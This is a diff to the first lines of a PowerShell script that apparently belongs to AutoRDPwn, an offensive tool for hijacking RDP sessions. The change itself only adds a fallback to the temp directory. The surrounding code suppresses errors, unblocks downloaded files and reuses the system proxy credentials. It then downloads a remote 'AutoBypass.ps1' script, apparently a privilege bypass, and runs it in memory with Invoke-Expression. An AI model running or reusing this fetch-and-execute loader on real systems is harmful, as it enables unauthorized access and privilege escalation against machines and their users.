@@ -1,6 +1,6 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform ; $ErrorActionPreference = "SilentlyContinue"
 $noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; $noclean=$args[9] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
-$checkpath = Get-ChildItem $pwd\resources\Scripts ; if ($? -eq $true){ $local = "True" ; $localpath = $pwd ; Get-ChildItem -Path $localpath -Recurse | Unblock-File }
+$checkpath = Get-ChildItem $pwd\resources\Scripts ; if ($? -eq $true){ $local = "True" ; $localpath = $pwd ; Get-ChildItem -Path $localpath -Recurse | Unblock-File } else { Set-Location $env:temp }
 [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials ; $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 
 if ($OSVersion -like 'Win*'){ if ($local){ Import-Module $localpath\Resources\Scripts\AutoBypass.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1')}
